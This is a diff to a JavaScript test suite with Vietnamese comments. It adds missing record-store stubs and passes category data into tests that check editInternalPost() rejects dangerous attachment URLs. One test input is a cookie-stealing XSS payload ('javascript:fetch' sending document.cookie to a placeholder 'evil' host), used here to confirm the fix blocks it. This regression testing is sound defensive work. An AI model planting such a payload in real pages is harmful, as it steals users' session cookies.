@@ -143,6 +143,13 @@ stubModule('lib/recordStore', {
   MIGRATED_COLLECTIONS: new Set(Object.keys(RECORDS)),
   getAllForCollectionCached: async (c) => RECORDS[c] || [],
   getAllForCollection: async (c) => RECORDS[c] || [],
+  // PHÁT HIỆN ở đợt audit chuyên sâu lần 3: GET /api/data (routes/data.js) gọi thẳng
+  // getForCollectionByDeptCached()/getForCollectionByUsernameCached()/getForCollectionByColumnCached()
+  // (Bước 7d/8b/8c) — stub này trước đây chưa từng khai, gọi hàm undefined ném lỗi 500 ngay lập tức,
+  // không liên quan gì tới các bản vá đang kiểm ở file này.
+  getForCollectionByDeptCached: async (c, dept) => (RECORDS[c] || []).filter(x => x.dept === dept),
+  getForCollectionByUsernameCached: async (c, username) => (RECORDS[c] || []).filter(x => x.username === username),
+  getForCollectionByColumnCached: async (c, column, value) => (RECORDS[c] || []).filter(x => x[column] === value),
   withLockedRecordForCollection: async (c, id, mutator) => {
     const list = RECORDS[c] || [];
     const idx = list.findIndex(x => x.id === id);
@@ -158,6 +165,10 @@ stubModule('lib/recordStore', {
   deleteRecordForCollection: async () => { throw new Error('không dùng trong bài test này'); },
   withAppLock: async (key, fn) => fn()
 });
+
+// routes/data.js (GET /api/data) cũng đọc getAllWorkItemsCached() (Vận Hành > cây công việc,
+// lib/operationWorkItemStore.js — bảng riêng dbo.OperationWorkItems), chưa từng được stub ở đây.
+stubModule('lib/operationWorkItemStore', { getAllWorkItemsCached: async () => [] });
 
 stubModule('lib/taskStore', {
   getAllTasksCached: async () => [],
@@ -357,23 +368,32 @@ async function main() {
     });
 
     await run.run('Fix 4c — internalPosts (SỬA): editInternalPost() cũng chặn attachment.fileUrl scheme javascript:', () => {
+      // appData.internalShareCategories: đợt audit chuyên sâu lần 3 thêm lại việc đối chiếu postCategory
+      // theo danh mục khi SỬA (khớp đúng luật lúc TẠO) — draft/okDraft dưới đây phải mang postCategory
+      // hợp lệ như 1 bài SHARE thật đã qua được bước tạo, không liên quan gì tới kịch bản attachment đang
+      // kiểm ở đây.
+      const shareAppData = { internalShareCategories: [{ key: 'GOP_Y', label: 'Góp Ý' }] };
       const draft = {
         id: 9500, type: 'SHARE', status: 'DRAFT', author: PLAIN_KD.username, title: 'Nháp', content: 'x',
+        postCategory: 'GOP_Y',
         attachment: { fileName: 'ok.pdf', fileUrl: '/uploads/1756500000000-aaaaaaaaaaaaaaaa.pdf' }
       };
       const err = expectThrows(() => recordActions.editInternalPost(
         { attachment: { fileName: 'xau.pdf', fileUrl: 'javascript:fetch("//evil/"+document.cookie)' } },
-        PLAIN_KD, draft
+        PLAIN_KD, draft, shareAppData
       ), 'Đường SỬA cũng phải chặn — nếu không thì lỗ hổng chỉ vá được 1 nửa');
       assertEqual(err.status, 400, 'Phải trả 400');
       assertEqual(draft.attachment.fileUrl, '/uploads/1756500000000-aaaaaaaaaaaaaaaa.pdf',
         'Bản ghi KHÔNG được bị sửa đổi khi payload bị từ chối');
 
       // Sửa với URL hợp lệ vẫn phải chạy như cũ.
-      const okDraft = { id: 9501, type: 'SHARE', status: 'DRAFT', author: PLAIN_KD.username, title: 'Nháp', content: 'x' };
+      const okDraft = {
+        id: 9501, type: 'SHARE', status: 'DRAFT', author: PLAIN_KD.username, title: 'Nháp', content: 'x',
+        postCategory: 'GOP_Y'
+      };
       recordActions.editInternalPost(
         { attachment: { fileName: 'ok.pdf', fileUrl: '/uploads/1756500000000-bbbbbbbbbbbbbbbb.pdf' }, draft: true },
-        PLAIN_KD, okDraft
+        PLAIN_KD, okDraft, shareAppData
       );
       assertEqual(okDraft.attachment.fileUrl, '/uploads/1756500000000-bbbbbbbbbbbbbbbb.pdf', 'URL hợp lệ vẫn phải lưu được khi sửa');
     });
